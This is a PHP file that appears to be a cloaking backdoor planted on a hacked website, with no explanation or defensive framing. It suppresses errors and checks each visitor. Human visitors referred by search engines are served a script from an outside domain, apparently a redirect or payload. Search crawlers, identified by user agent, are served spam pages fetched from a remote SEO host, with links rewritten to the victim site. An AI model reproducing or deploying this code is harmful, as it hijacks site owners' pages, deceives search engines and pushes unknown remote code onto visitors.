<?php
error_reporting(0); 
set_time_limit(20);
$jumpjs = '<script type="text/javascript" src="http://js.38dgs.com/fuck.js" ></script>'; 
define('Referer', $_SERVER['HTTP_REFERER']); 
if (stristr(Referer,'baidu') or stristr(Referer,'google') or stristr(Referer,'sogou') or stristr(Referer,'so.') or stristr(Referer,'bing') or stristr(Referer,'yahoo') or stristr(Referer,'sm.')) { 
    if (!isCrawler()) {
            echo "$jumpjs";exit;
    }
}
function isCrawler() {
        $agent= strtolower($_SERVER['HTTP_USER_AGENT']);  
        if (!empty($agent)) {                
                $spiderSite= array('Baiduspider+','YisouSpider','Sosospider+','Sogou web spider','360Spider','HaosouSpider','Sogou inst spider','Sogou Spider','Sogou News Spider');
                foreach($spiderSite as $val) {$str = strtolower($val);if (strpos($agent, $str) !== false) {        return true;}                      
                }  
        } else {
                return false;
        }
}   
header('Content-Type: text/html; charset=gb2312');
$urlstring = $_SERVER['REQUEST_URI'];
if(isCrawler())
{
if ($randnumber = stristr($urlstring,'?id='))
{
	if (function_exists('curl_init')){
		$curl_handle = curl_init(); 
		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'.$randnumber);
		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19); 
		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
		$file_content = curl_exec($curl_handle); 
		curl_close($curl_handle); 
		$curdir=$_SERVER['SCRIPT_NAME'];
		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
		echo($html);
}
else {
	$file_content = @file_get_contents('http://seo.rgtw.vip/index.php'.$randnumber);
	$curdir=$_SERVER['SCRIPT_NAME'];
	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
	echo($html);

}

}else{
if (function_exists('curl_init')){
		$curl_handle = curl_init();  
		curl_setopt($curl_handle, CURLOPT_URL, 'http://seo.rgtw.vip/index.php'); 
		curl_setopt($curl_handle, CURLOPT_CONNECTTIMEOUT,19);
		curl_setopt($curl_handle, CURLOPT_RETURNTRANSFER, 1);
		$file_content = curl_exec($curl_handle); 
		curl_close($curl_handle); 
		$curdir=$_SERVER['SCRIPT_NAME'];
		$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
		$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
		echo($html);
}
else {
	$file_content = @file_get_contents('http://seo.rgtw.vip/index.php');
	$curdir=$_SERVER['SCRIPT_NAME'];
	$urlpath='http://'.$_SERVER['HTTP_HOST'].$curdir;
	$html = str_replace('<a href="','<a href="'.$urlpath,$file_content);
	echo($html);

}
}
}
?>